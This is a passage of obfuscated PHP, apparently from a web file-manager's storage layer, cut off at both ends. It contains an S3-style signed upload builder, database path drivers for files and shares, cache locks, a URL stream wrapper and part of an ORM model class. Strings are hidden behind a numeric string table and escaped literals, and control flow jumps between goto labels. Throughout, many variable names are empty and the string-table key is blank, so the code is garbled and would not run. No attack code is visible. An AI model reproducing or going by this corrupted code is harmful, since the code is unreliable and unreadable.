{ return !0; } public function uploadFormData($, $Ͳ = 3600) { $ݒ̉ =& $_SERVER[]; $ԕ = $ݒ̉[213]; $ = $ݒ̉[253]; $΅ = $ݒ̉[62]; $٭ә = gmdate($ݒ̉[254]); $͊͂ = gmdate($ݒ̉[255]); $ = $ݒ̉[256]; $ = $Ͳ . $ݒ̉[12]; $ = $ݒ̉[257]; $ = array($this->accessKey, $͊͂, $this->region, $΅, $); $僛 = implode($ݒ̉[8], $); $ = array($ݒ̉[258] => gmdate($ݒ̉[259], strtotime($ݒ̉[260])), $ݒ̉[261] => array(array($ݒ̉[262] => $this->bucket), array($ݒ̉[263] => $ԕ), array($ݒ̉[264], $ݒ̉[265], $ݒ̉[12]), array($ݒ̉[264], $ݒ̉[266], $ݒ̉[12]), array($ݒ̉[264], $ݒ̉[267], $ݒ̉[12]), array($ݒ̉[268] => $), array($ݒ̉[269] => $僛), array($ݒ̉[270] => $), array($ݒ̉[271] => $٭ә), array($ݒ̉[272] => $))); $ = base64_encode(json_encode($)); $ = hash_hmac($ݒ̉[273], $͊͂, $ݒ̉[274] . $this->secret, !0); $쵞 = hash_hmac($ݒ̉[273], $this->region, $, !0); $ѽ = hash_hmac($ݒ̉[273], $΅, $쵞, !0); $ = hash_hmac($ݒ̉[273], $, $ѽ, !0); $ˈ = hash_hmac($ݒ̉[273], $, $); $ְ = array($ݒ̉[230] => $ݒ̉[12], $ݒ̉[275] => $ݒ̉[12], $ݒ̉[263] => $ԕ, $ݒ̉[268] => $, $ݒ̉[276] => $, $ݒ̉[277] => $僛, $ݒ̉[278] => $, $ݒ̉[279] => $٭ә, $ݒ̉[280] => $, $ݒ̉[281] => $ˈ, $ݒ̉[196] => $this->getHost()); return $ְ; } } goto a; c⢞: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($ɼ) { $this->pathParse = $ɼ; $this->model = Model($_SERVER[][1373]); } public function getPath($ۯԃ) { return trim($ۯԃ, $_SERVER[][8]); } public function pathFather($풳) { $ʺ = $this->parse($풳); $ʺ = $this->infoSimple($풳); return $ʺ ? $ʺ[$_SERVER[][180]] : !1; } public function pathThis($) { $ʦ = $this->infoSimple($); return $ʦ ? $ʦ[$_SERVER[][32]] : !1; } public function getPathOuter($퓛) { if (!$퓛) { return $퓛; } $߾ = $this->parse($퓛); return KodIO::make($߾[$_SERVER[][443]]); } public function copyFolderFromIO($۱, $Ƈ, $ӵġ, $ܳ, $) { $ã = $this->model->copyFolderFromIO($۱, $Ƈ, $ӵġ, $ܳ, $); return KodIO::make($ã); } public function isParentOf($聒, $狅) { return $this->model->isParentOf($聒, $狅); } public function mkfile($, $ = '', $戂 = REPEAT_RENAME) { $ =& $_SERVER[]; $ = $this->parse($); $ = $[$[443]]; for ($ا = 0; $ا < count($[$[1374]]); $ا++) { $ = $[$[1374]][$ا]; if ($ا == count($[$[1374]]) - 1) { $ = $this->model->mkfile($, $, $, $戂); break; } $ = $this->model->mkdir($, $, REPEAT_SKIP); } return $this->getPathOuter($); } public function mkdir($, $倄ŭ = REPEAT_SKIP) { $ڵ =& $_SERVER[]; $ = $this->parse($); $ = $[$ڵ[443]]; for ($ = 0; $ < count($[$ڵ[1374]]); $++) { $ۏ = $[$ڵ[1374]][$]; $ = $this->model->mkdir($, $ۏ, $倄ŭ); } return $this->getPathOuter($); } public function copyFile($ȵē, $ߕڹ, $Ƣث = REPEAT_REPLACE) { $ =& $_SERVER[]; $䢲 = $this->parse($ߕڹ); $Ѓ = $this->model->copy($ȵē, $䢲[$[443]], $Ƣث, $䢲[$[84]]); return $Ѓ ? $this->getPathOuter($Ѓ) : !1; } public function moveFile($߆, $, $ю = REPEAT_REPLACE) { $ =& $_SERVER[]; $ = $this->parse($); $Њ = $this->model->move($߆, $[$[443]], $ю, $[$[84]]); return $Њ ? $this->getPathOuter($Њ) : !1; } public function copy($׀ډ, $ʹ, $ = REPEAT_REPLACE, $ = false) { $۬ = $this->parse($ʹ); $԰ = $this->model->copy($׀ډ, $۬[$_SERVER[][443]], $, $); return $԰ ? $this->getPathOuter($԰) : !1; } public function moveSameAllow() { } public function move($, $嶚, $܀ = REPEAT_REPLACE, $ = false) { $ = $this->parse($嶚); $Ґ = $this->model->move($, $[$_SERVER[][443]], $܀, $); return $Ґ ? $this->getPathOuter($Ґ) : !1; } public function remove($, $§ = true) { return $this->model->remove($, $§); } public function rename($֤, $) { $ = $this->model->rename($֤, $); return $ ? $this->getPathOuter($֤) : $; } public function size($폩) { $⁤ϰ = $this->infoSimple($폩); return $⁤ϰ ? $⁤ϰ[$_SERVER[][76]] : 0; } public function infoSimple($ڢ) { return $this->model->sourceInfo($ڢ); } public function info($) { return $this->infoParse($); } public function infoAuth($) { return $this->infoParse($, !1, !0); } public function infoWithChildren($ӆ) { return $this->infoParse($ӆ, !0); } protected function infoParse($ͩ, $ݤ = false, $ĵ = false) { if (!$ݤ) { return $this->model->pathInfo($ͩ, $ĵ); } return $this->model->pathInfoMore($ͩ); } public function infoFullSimple($̮) { $ =& $_SERVER[]; $Թ = explode($[8], $̮); $ڴ = implode($[8], array_splice($Թ, 1)); return $this->model->pathInfoByPath($Թ[0], $ڴ); } public function infoFull($) { $󌂺 = $this->infoFullSimple($); return is_array($󌂺) ? $this->model->pathInfo($󌂺[$_SERVER[][181]]) : !1; } public function hashSimple($) { $ϒ =& $_SERVER[]; $ = $this->infoWithChildren($); return $[$ϒ[516]][$ϒ[640]]; } public function hashMd5($̨) { $ =& $_SERVER[]; $߄ = $this->infoWithChildren($̨); return $߄[$[516]][$[641]]; } public function exist($珣) { $엊 =& $_SERVER[]; $ = $this->parse($珣); if (!$[$엊[84]]) { return $this->isFile($珣) || $this->isFolder($珣); } $྄ = array($엊[445] => $[$엊[443]], $엊[32] => $[$엊[84]]); $ݔ = $this->model->where($྄)->find(); return $ݔ ? !0 : !1; } public function isFile($) { $ =& $_SERVER[]; $󘇧 = $this->infoSimple($); return $󘇧 && $󘇧[$[453]] == $[212] ? !0 : !1; } public function isFolder($Ш) { $ =& $_SERVER[]; $ˈˀ = $this->infoSimple($Ш); return $ˈˀ && $ˈˀ[$[453]] == $[88] ? !0 : !1; } public function listPath($, $Ը = false) { $ =& $_SERVER[]; if ($ == $[12]) { return !1; } $ = array($[445] => $); if ($Ը) { return $this->model->listSource($, -1); } return $this->model->listSource($); } public function has($ʅ, $ = false, $ڍ = null) { $⭓ =& $_SERVER[]; $ױ = $this->infoWithChildren($ʅ); if ($) { return array($⭓[224] => $ױ[$⭓[224]], $⭓[223] => $ױ[$⭓[223]]); } return $ڍ ? $ױ[$⭓[224]] : $ױ[$⭓[223]]; } public function listAll($) { $ِͰ = IO::info($this->pathParse[$_SERVER[][84]]); if (!$ِͰ) { return array(); } return $this->model->listAll($); } public function getContent($) { return $this->model->getContent($); } public function setContent($ƶ, $ = '') { return $this->model->setContent($ƶ, $); } public function fileSubstr($ꎥ, $Ŋ, $񏱸) { return $this->model->fileSubstr($ꎥ, $Ŋ, $񏱸); } public function download($Ǘ, $Ό = '') { $փ = get_path_father($Ό); $ = get_path_this($Ό); $ = $this->model->fileInfoGet($Ǘ); $ɩ = IO::copy($[$_SERVER[][84]], $փ, !1, $); return $ɩ; } public function setModifyTime($螤Ư, $Ǩ = '') { $Ԇ =& $_SERVER[]; if (!$螤Ư) { return; } $this->model->where(array($Ԇ[459] => $螤Ư))->save(array($Ԇ[85] => $Ǩ)); } public function upload($, $ƀ, $ = false, $ࠠ = REPEAT_REPLACE) { $ǡ =& $_SERVER[]; $ = $this->parse($); $Ą = $this->model->addFile($[$ǡ[443]], $ƀ, $[$ǡ[84]], $, $ࠠ); return $this->getPathOuter($Ą); } public function uploadFileByID($, $Ƈ, $) { $֙ =& $_SERVER[]; $ = $this->parse($); $ = $this->model->addFileByFileID($[$֙[443]], $Ƈ, $[$֙[84]], $); return $this->getPathOuter($); } public function addFileByRemote($, $ւ, $ = array(), $ = '', $ǠǼ) { $Ӎ =& $_SERVER[]; $ӱ = $this->parse($); $ = empty($) ? $ӱ[$Ӎ[84]] : $; $ = $this->model->addFileByRemote($ӱ[$Ӎ[443]], $ւ, $, $, $ǠǼ); return $this->getPathOuter($); } public function uploadLink($쓾, $ی = 0) { $ =& $_SERVER[]; $š = $this->parse($쓾); $ڟ = _get($GLOBALS[$[7]], $[1375]); $ = _get($GLOBALS[$[7]], $[1376]); $쓾 = Model($[643])->createFileName($š[$[84]], $ڟ, $); return IO::uploadLink($쓾, $ی); } public function fileNameAuto($ˮ, $, $Ƴ = REPEAT_REPLACE, $ = false) { return $this->model->fileNameAuto($ˮ, $, $Ƴ, $); } public function fileNameExist($ȁ, $) { return $this->model->fileNameExist($ȁ, $); } protected function _fileOut($󸬱, $ꛘæ = false, $ = false, $𙞠 = '', $ = false) { $ =& $_SERVER[]; $ = $this->model->sourceInfo($󸬱); if ($[$[453]] == $[88]) { header($[1377]); die; } $ϳ = $this->model->fileInfoGet($󸬱); $𙞠 = $ϳ[$[641]] ? $ϳ[$[641]] : $𙞠; $ = is_array($GLOBALS[$[169]]) ? $GLOBALS[$[169]][$[32]] : $[$[32]]; if ($) { return IO::fileOutServer($ϳ[$[84]], $ꛘæ, $, $𙞠); } IO::fileOut($ϳ[$[84]], $ꛘæ, $, $𙞠); } public function fileOut($, $Ӡ = false, $ = false, $ = '') { $this->_fileOut($, $Ӡ, $, $); } public function fileOutServer($Ĭ, $з = false, $Ȯ = false, $ = '') { $this->_fileOut($Ĭ, $з, $Ȯ, $, !0); } protected function _fileOutImage($, $ٞݵ = 250) { $ =& $_SERVER[]; $װٱ = $this->model->pathInfo($); if ($װٱ[$[453]] == $[88]) { show_json($[1378] . $, !1); } $۩ = $this->model->fileInfoGet($); $װٱ[$[170]] = $۩[$[84]]; $GLOBALS[$[169]] = $װٱ; IO::fileOutImage($۩[$[84]], $ٞݵ); } public function fileOutImage($؝, $ = 250) { $this->_fileOutImage($؝, $); } public function fileOutImageServer($䘁, $Ѩ = 250) { $this->_fileOutImage($䘁, $Ѩ); } public function link($, $̯ = '') { $ꗡ = $this->model->fileInfoGet($); return IO::link($ꗡ[$_SERVER[][84]], $̯); } protected function parse($湷) { $Ñ =& $_SERVER[]; if (strstr($湷, $Ñ[8]) === !1) { return array($Ñ[461] => intval($湷), $Ñ[84] => $Ñ[12], $Ñ[1374] => array()); } $ = explode($Ñ[8], trim($湷, $Ñ[8])); if (count($) < 2) { show_tips(clear_html($湷) . $Ñ[1379]); } return array($Ñ[461] => intval($[0]), $Ñ[84] => $[1], $Ñ[1374] => array_slice($, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($) { $this->pathParse = $; $this->model = Model($_SERVER[][1373]); } public function getPathOuter($낵) { $ݙ =& $_SERVER[]; if (!$낵) { return $낵; } $̒ = $this->parse($낵); return trim(KodIO::makeShare($this->pathParse[$ݙ[443]], $̒[$ݙ[443]]), $ݙ[8]); } protected function infoParse($퍅, $懫 = false, $擨 = false) { $û =& $_SERVER[]; $۹¦ = $this->pathParse[$û[443]]; $ = trim($this->pathParse[$û[1207]], $û[8]); return Action($û[1380])->sharePathInfo($۹¦, $, $懫); } public function infoFull($޵) { $Ɓ̡ =& $_SERVER[]; $ = explode($Ɓ̡[8], trim($޵, $Ɓ̡[8])); if (count($) > 1) { $ = implode($Ɓ̡[8], array_splice($, 1)); $ӯ = $this->model->pathInfoByPath($[0], $); if (!$ӯ) { return !1; } $this->pathParse[$Ɓ̡[1207]] = $ӯ[$Ɓ̡[181]]; } return $this->infoParse($޵); } public function listAll($) { $ڤ =& $_SERVER[]; $䤇 = IO::info($this->pathParse[$ڤ[84]]); if (!$䤇) { return array(); } $Õ = $this->model->listAll($); $ˤ = Model($ڤ[632])->getInfo($䤇[$ڤ[633]]); foreach ($Õ as &$Σ) { check_abort(); $Σ[$ڤ[87]] = Action($ڤ[1380])->_shareItemeParse($Σ[$ڤ[87]], $ˤ); } unset($Σ); return $Õ; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($) { $this->pathParse = $; $this->model = Model($_SERVER[][1373]); } protected function infoParse($۹, $ = false, $Є = false) { $ʏݷ =& $_SERVER[]; return Action($ʏݷ[1213])->sharePathInfo($this->pathParse[$ʏݷ[84]], !0, $); } public function listPath($, $ԶƗ = false) { $䙼 =& $_SERVER[]; $ۧ҃ = parent::listPath($, $ԶƗ); if (!$ۧ҃) { return $ۧ҃; } if (is_array($ۧ҃[$䙼[1381]])) { $ۧ҃[$䙼[1381]] = Action($䙼[1213])->shareItemInfo($ۧ҃[$䙼[1381]]); } foreach ($ۧ҃ as $ => $) { if (!in_array($, array($䙼[83], $䙼[82]))) { continue; } foreach ($ as $Ȣ => $ʫ) { $ۧ҃[$][$Ȣ] = Action($䙼[1213])->shareItemInfo($ʫ); } } return $ۧ҃; } public function listAll($) { $؛ =& $_SERVER[]; $ = IO::info($this->pathParse[$؛[84]]); if (!$) { return array(); } $Ϳ = $this->model->listAll($); foreach ($Ϳ as &$ȳ) { $ȳ[$؛[87]] = Action($؛[1213])->shareItemInfo($ȳ[$؛[87]]); } unset($ȳ); return $Ϳ; } } goto fݔܫ; d鑊: class CacheLockMemcached { public function lock($ҟ, $֯ = 0) { $ = Cache::init(); $ݢ = microtime(!0) + $֯; while (microtime(!0) < $ݢ) { $؉ݱ = $->get($ҟ); if (!$؉ݱ || $؉ݱ < microtime(!0)) { $Ν = $->handle->add($ҟ, $ݢ, $֯); if ($Ν) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($) { return Cache::init()->get($); } public function unlock($˺) { return Cache::init()->remove($˺); } } class CacheLockDatabase { public function lock($, $ƣ = 0) { $ = Model($_SERVER[][863]); $ = microtime(!0) + $ƣ; while (microtime(!0) < $) { $Ͱ = $->get($); if (!$Ͱ || $Ͱ < microtime(!0)) { $Ԩ = $->set($, $); if ($Ԩ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($η) { return Model($_SERVER[][863])->get($η); } public function unlock($) { Model($_SERVER[][863])->remove($); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($ɹ, $΀) { $ж =& $_SERVER[]; if (!class_exists($ж[901])) { show_json($ж[902], !1); } $this->cacheTime = $΀; $this->handle = new Memcached(); if (is_array($ɹ[$ж[903]]) && count($ɹ[$ж[903]]) >= 1) { foreach ($ɹ[$ж[903]] as $) { $ = explode($ж[4], $); $this->handle->addServer($[0], $[1]); } } else { $this->handle->addServer($ɹ[$ж[196]], $ɹ[$ж[197]]); } } public function set($ߧ, $≊, $ = false) { $ = $ ? $ : $this->cacheTime; return $this->handle->set($ߧ, $≊, $); } public function get($ᔇ) { return $this->handle->get($ᔇ); } public function remove($ڣ꡽) { return $this->handle->delete($ڣ꡽); } public function deleteAll() { return $this->handle->flush(); } } goto e΅; eƌ: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($ = false) { } public function exist($) { $ = $this->info($); return $[$_SERVER[][216]]; } public function isFile($¸) { $ = $this->info($¸); return $[$_SERVER[][216]]; } public function isFolder($) { return !1; } public function size($ě) { $ա = $this->info($ě); return $ա[$_SERVER[][76]]; } public function info($듚) { return $this->infoParse($듚); } public function infoAuth($ӣ) { return $this->infoParse($ӣ); } public function infoWithChildren($ו) { return $this->infoParse($ו); } public function infoFull($曉ũ) { return $this->infoParse($曉ũ); } private function infoParse($) { $ =& $_SERVER[]; $Ä߰ = $this->header($); if (!$Ä߰ || !$Ä߰[$[784]]) { return !1; } $Շ = _get($Ä߰, $[381], 0); $ = array($[32] => $Ä߰[$[32]], $[84] => $, $[33] => $[214], $[76] => intval($Շ), $[175] => get_path_ext($Ä߰[$[32]]), $[1404] => $Շ > 0 && $Ä߰[$[1527]], $[1405] => !1); return $; } private function header($ݜ) { $שϹ =& $_SERVER[]; if (isset(self::$_cacheHeader[$ݜ])) { return self::$_cacheHeader[$ݜ]; } $ = isset($GLOBALS[$שϹ[1528]]) ? $GLOBALS[$שϹ[1528]] : !1; $GLOBALS[$שϹ[1528]] = !0; self::$_cacheHeader[$ݜ] = url_header($ݜ); $GLOBALS[$שϹ[1528]] = $; return self::$_cacheHeader[$ݜ]; } public function hashSimple($Ȯ, $ʏ = false) { $Γ =& $_SERVER[]; $Ҵ = $this->info($Ȯ); if (!$Ҵ || !$Ҵ[$Γ[216]]) { return !1; } $ӭ̩ = $Ҵ[$Γ[76]]; $ӣ = 200; $锧ͬ = 50; if ($ӭ̩ <= $ӣ * $锧ͬ) { return md5($this->fileSubstr($Ȯ, 0, $ӭ̩)) . $ӭ̩; } $ = intval($ӭ̩ / $锧ͬ); $ = $Γ[12]; $ = timeFloat(); $׻ = 15; for ($㧛 = 0; $㧛 < $锧ͬ; $㧛++) { if (timeFloat() - $ > $׻) { return !1; } $ = $this->fileSubstr($Ȯ, $ * $㧛, $ӣ); if (!$) { return !1; } $ .= $; } $ .= $this->fileSubstr($Ȯ, $ӭ̩ - $ӣ, $ӣ); return md5($) . $ӭ̩; } public function getContent($ځ) { return $this->fileSubstr($ځ); } public function fileSubstr($Ա, $ͧ = 0, $Х = -1) { $؀ =& $_SERVER[]; $ = $this->info($Ա); if (!$ || !$[$؀[216]] && $[$؀[76]] > 1024 * 1024 * 10) { return !1; } if ($Х === -1) { $Х = $[$؀[76]]; } if ($Х == 0) { return $؀[12]; } $Ҙ = array($؀[1529] . $ͧ . $؀[816] . ($ͧ + $Х - 1)); $ҭ = url_request($Ա, $؀[245], !1, $Ҙ, !1, !1, 30); return $ҭ[$؀[1243]] ? $ҭ[$؀[1243]] : $؀[12]; } public function download($ܠ, $ޒ) { Downloader::start($ܠ, $ޒ); return $ޒ; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($ާ, $ = '') { $this->info = $this->info($ާ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[][84]]; $this->pathOpen = $ާ; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$ާ])) { self::$_chunkBuffer[$ާ] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($) { $҅ = $this->fileSubstr($this->pose, $); $this->pose += strlen($҅); return $҅; } public function stream_tell() { return $this->pose; } public function stream_seek($, $ª) { $׷ =& $_SERVER[]; if ($ª == SEEK_SET) { $this->pose = $; } else { if ($ª == SEEK_CUR) { $this->pose += $; } else { if ($ª == SEEK_END) { $this->pose = $this->info[$׷[76]] + intval($); } } } if ($ < 0) { $this->pose = $this->info[$׷[76]] + $; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[][76]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($, $ҕ) { $讗 =& $_SERVER[]; $̆ = $this->info($); return array($讗[1530] => 0, $讗[1531] => 0, $讗[16] => 32768 + 511, $讗[1532] => 0, $讗[1533] => 0, $讗[1534] => 0, $讗[1535] => 0, $讗[76] => $̆[$讗[76]], $讗[1536] => $̆[$讗[1403]], $讗[1492] => $̆[$讗[85]], $讗[1491] => $̆[$讗[215]], $讗[1537] => 0, $讗[1538] => 0); } static $fileInfo = array(); public function info($) { $졘 = $_SERVER[][1539]; if (isset(self::$fileInfo[$])) { return self::$fileInfo[$]; } if (substr($, 0, strlen($졘)) != $졘) { return !1; } self::$fileInfo[$] = IO::info(substr($, strlen($졘))); return self::$fileInfo[$]; } public static function read($ӄ, $ѩʱ, $) { if (!isset(self::$_fopenCache[$ӄ])) { $ = new StreamWrapperIO(); $->stream_open($ӄ); self::$_fopenCache[$ӄ] = $; } $ = self::$_fopenCache[$ӄ]; return $->fileSubstr($ѩʱ, $); } public static function _read($ᒛ, $⮃, $) { $ =& $_SERVER[]; $܎ = fopen($ᒛ, $[1407]); if (!$܎) { return $[12]; } $ = 8192; fseek($܎, $⮃, SEEK_SET); $ = $[12]; $ = 0; while ($ < $) { $ = min($, $ - $); $ .= fread($܎, $); $ += $; } fclose($܎); return $; } public function fileSubstr($Б, $ƕ) { $ =& $_SERVER[]; $ = $this->info[$[76]]; $ȡ = $Б; $ = $ƕ; if ($Б < 0) { $Б = $ + $Б; } if ($ƕ === !1) { $ƕ = $ - $Б; } if ($Б + $ƕ > $) { $ƕ = $ - $Б; } if ($ƕ <= 0) { return $[12]; } if ($Б < 0 || $Б >= $ || $ƕ <= 0 || $ƕ > 1024 * 1024 * 10) { throw new Exception("\x69\157\106\151\x6c\145\122\145\x61\144\40\x65\x72\162\x6f\x72\x21\x20\163\x74\x61\162\164\x3d{$Б}\73\x6c\x65\156\x67\x74\x68\75{$ƕ}\x3b\40\x73\x69\172\x65\75{$}\x3b"); } $ո = 64 * 1024; $ؔ =& self::$_chunkBuffer[$this->path]; if (!$ؔ) { $ؔ = array(); } $ = 0; $؎ = 0; $擊 = $[12]; foreach ($ؔ as $ => $擊) { $ = intval($); $؎ = $ + strlen($擊); if ($Б >= $؎) { continue; } if ($Б >= $ && $Б + $ƕ <= $؎) { return substr($擊, $Б - $, $ƕ); } break; } if (count($ؔ) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($[1540], $[1541] . count($ؔ) . "\x3b\163\x74\141\162\x74\x3d{$Б}\54\154\145\x6e\x67\164\150\x3d{$ƕ}\73\160\157\163\x65\72{$}\176{$؎}"); throw new Exception($[1542]); } $ = intval($Б / $ո) * $ո; $ = ceil(($Б + $ƕ) / $ո) * $ո - $; $ = IO::fileSubstr($this->path, $, $); $ؔ[$ . $[12]] = $; ksort($ؔ); $݄ = substr($, $Б - $, $ƕ); return $݄; } private function log($ɸ, $Ԓ) { $𫔤 =& $_SERVER[]; $ = timeFloat() - $this->timeStart; write_log(sprintf($𫔤[1543], $ɸ, $this->info[$𫔤[32]], $, $Ԓ), $𫔤[1221]); } } class Message { function __construct() { } public function send($Φ = '', $И = array(), $ʕ = "\164\x65\170\x74") { $׋ =& $_SERVER[]; $ߓЉ = array($׋[33] => $׋[1544], $׋[788] => $Φ); if (in_array($ʕ, array($׋[1544], $׋[1545]))) { $ߓЉ[$׋[33]] = $ʕ; } $И = array($׋[547] => isset($И[$׋[547]]) ? $И[$׋[547]] : $׋[12], $׋[630] => isset($И[$׋[630]]) ? $И[$׋[630]] : $׋[12]); if (empty($Φ) || empty($И[$׋[547]]) && empty($И[$׋[630]])) { return !1; } $ = array($׋[1485] => $ߓЉ, $׋[1546] => $И); Hook::trigger($׋[1547], $); } } goto bɿ; a: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\142\154\145", "\157\x72\144\145\x72", "\141\x6c\151\141\x73", "\150\x61\x76\151\x6e\147", "\147\162\x6f\165\160", "\154\157\143\153", "\x64\151\x73\164\x69\156\143\x74", "\x61\x75\164\x6f", "\146\151\154\x74\x65\162", "\166\141\154\151\144\x61\x74\145", "\x72\145\x73\165\154\x74", "\142\x69\156\144", "\x74\157\x6b\145\x6e"); public function __construct($ׁ = '', $ɟ = '', $ = '') { $ =& $_SERVER[]; $this->_initialize(); if (!empty($ׁ)) { if (strpos($ׁ, $[10])) { list($this->dbName, $this->name) = explode($[10], $ׁ); } else { $this->name = $ׁ; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($ɟ)) { $this->tablePrefix = $[12]; } elseif ($[12] != $ɟ) { $this->tablePrefix = $ɟ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($[288]); } $this->db(0, empty($this->connection) ? $ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $ =& $_SERVER[]; if (empty($this->fields)) { if (think_config($[289])) { $욣 = $this->dbName ? $this->dbName : think_config($[290]); $Ɵے = think_var_cache($[291] . strtolower(get_path_this($욣) . $[10] . $this->name)); if ($Ɵے) { $ߠܗ = think_config($[292]); if (empty($ߠܗ) || $Ɵے[$[293]] == $ߠܗ) { $this->fields = $Ɵے; return; } } } $this->flush(); } } public function flush() { $ =& $_SERVER[]; $this->db->setModel($this->name); $܆ = $this->db->getFields($this->getTableName()); if (!$܆) { return !1; } $this->fields = array_keys($܆); $this->fields[$[294]] = !1; foreach ($܆ as $ => $­) { $[$] = $­[$[33]]; if ($­[$[39]]) { $this->fields[$[295]] = $; if ($­[$[42]]) { $this->fields[$[294]] = !0; } } } $this->fields[$[296]] = $; if (think_config($[292])) { $this->fields[$[293]] = think_config($[292]); } if (think_config($[289])) { $ = $this->dbName ? $this->dbName : think_config($[290]); think_var_cache($[291] . strtolower(get_path_this($) . $[10] . $this->name), $this->fields); } } public function switchModel($, $Ӗ = array()) { $֑ =& $_SERVER[]; $ = ucwords(strtolower($)) . $֑[297]; if (!class_exists($)) { think_exception($ . think_lang($֑[298])); } $this->_extModel = new $($this->name); if (!empty($Ӗ)) { foreach ($Ӗ as $輹) { $this->_extModel->setProperty($輹, $this->{$輹}); } } return $this->_extModel; } public function __set($ˬ, $ȿ) { $this->data[$ˬ] = $ȿ; } public function __get($ɑ) { return isset($this->data[$ɑ]) ? $this->data[$ɑ] : null; } public function __isset($ִ) { return isset($this->data[$ִ]); } public function __unset($) { unset($this->data[$]); } public function __call($, $յ) { $ܸ =& $_SERVER[]; if (in_array(strtolower($), $this->methods, !0)) { $this->options[strtolower($)] = $յ[0]; return $this; } elseif (in_array(strtolower($), array($ܸ[299], $ܸ[300], $ܸ[301], $ܸ[302], $ܸ[303]), !0)) { $¶ = isset($յ[0]) ? $յ[0] : $ܸ[203]; $¶ = $this->db->parseKey($¶); return $this->getField(strtoupper($) . $ܸ[304] . $¶ . $ܸ[305] . $, $ܸ[299]); } elseif (strtolower(substr($, 0, 5)) == $ܸ[306]) { $¶ = think_parse_name(substr($, 5)); $ں[$¶] = $յ[0]; return $this->where($ں)->find(); } elseif (strtolower(substr($, 0, 10)) == $ܸ[307]) { $Ȇ = think_parse_name(substr($, 10)); $ں[$Ȇ] = $յ[0]; return $this->where($ں)->getField($յ[1]); } elseif (isset($this->_scope[$])) { return $this->scope($, $յ[0]); } elseif (method_exists($this, $)) { array_unshift($յ, $); return call_user_func_array(array($this, $ܸ[308]), $յ); } else { return call_user_func_array(array(parent, $), $յ); } } protected function call() { $˕ =& $_SERVER[]; $ȕ = func_get_args(); $𤥭 = array_shift($ȕ); $ = $𤥭; if (is_array($𤥭)) { $ = $𤥭[1]; $𤥭 = $𤥭[0]; } $Á = count($ȕ) - 1; if (isset($ȕ[$Á]) && $ȕ[$Á] === $𤥭) { think_exception(__CLASS__ . $˕[4] . $𤥭 . think_lang($˕[309])); return; } $ȕ[] = $𤥭; if (method_exists($this, $˕[310])) { $ = call_user_func_array(array($this, $˕[311]), array($, $ȕ)); if (!is_null($) && $ !== !1) { return $; } } $ů = call_user_func_array(array($this, $𤥭), $ȕ); if (method_exists($this, $˕[312])) { $ = call_user_func_array(array($this, $˕[313]), array($, $ȕ, $ů)); if ($) { return $; } } return $ů; } protected function _initialize() { } protected function _facade($Ϲ) { $لϷ =& $_SERVER[]; if (!empty($this->fields)) { foreach ($Ϲ as $ => $狢) { if (is_array($this->fields) && !in_array($, $this->fields, !0)) { unset($Ϲ[$]); } elseif (is_scalar($狢)) { $this->_parseType($Ϲ, $); } } } if (!empty($this->options[$لϷ[314]])) { $Ϲ = array_map($this->options[$لϷ[314]], $Ϲ); unset($this->options[$لϷ[314]]); } $this->_beforeWrite($Ϲ); return $Ϲ; } protected function _beforeWrite(&$ם) { } public function add($ = '', $ = array(), $ = false) { if (empty($)) { if (!empty($this->data)) { $ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[][315]); return !1; } } $ = $this->_parseOptions($); $ = $this->_facade($); if (!1 === $this->_beforeInsert($, $)) { return !1; } $ = $this->db->insert($, $, $); if (!1 !== $) { $á = $this->getLastInsID(); if ($á) { $[$this->getPk()] = $á; $this->_after_insert($, $); return $á; } $this->_after_insert($, $); } return $; } protected function _beforeInsert(&$߻, $) { } protected function _after_insert($, $ߕʳ) { } public function addAll($ğ, $υ¶ = array(), $ = false) { $ =& $_SERVER[]; if (empty($ğ)) { $this->error = think_lang($[315]); return !1; } $υ¶ = $this->_parseOptions($υ¶); foreach ($ğ as $Ӂ => $ǯ) { $ğ[$Ӂ] = $this->_facade($ǯ); } if (method_exists($this->db, $[316])) { $郤 = $this->db->insertAll($ğ, $υ¶, $); } else { $this->startTrans(); foreach ($ğ as $Ӂ => $ǯ) { $郤 = $this->db->insert($ǯ, $υ¶, $); } $this->commit(); } if (!1 !== $郤) { $ = $this->getLastInsID(); if ($) { return $; } } return $郤; } public function selectAdd($ = '', $Ѥ = '', $ = array()) { $ =& $_SERVER[]; $ = $this->_parseOptions($); if (!1 === ($ = $this->db->selectInsert($ ? $ : $[$[317]], $Ѥ ? $Ѥ : $this->getTableName(), $))) { $this->error = think_lang($[318]); return !1; } else { return $; } } public function save($ߑ = '', $Ҭ¥ = array()) { $ᆮѱ =& $_SERVER[]; if (empty($ߑ)) { if (!empty($this->data)) { $ߑ = $this->data; $this->data = array(); } else { $this->error = think_lang($ᆮѱ[315]); return !1; } } $ߑ = $this->_facade($ߑ); $Ҭ¥ = $this->_parseOptions($Ҭ¥); $Ϸ = $this->getPk(); if (!isset($Ҭ¥[$ᆮѱ[319]])) { if (isset($ߑ[$Ϸ])) { 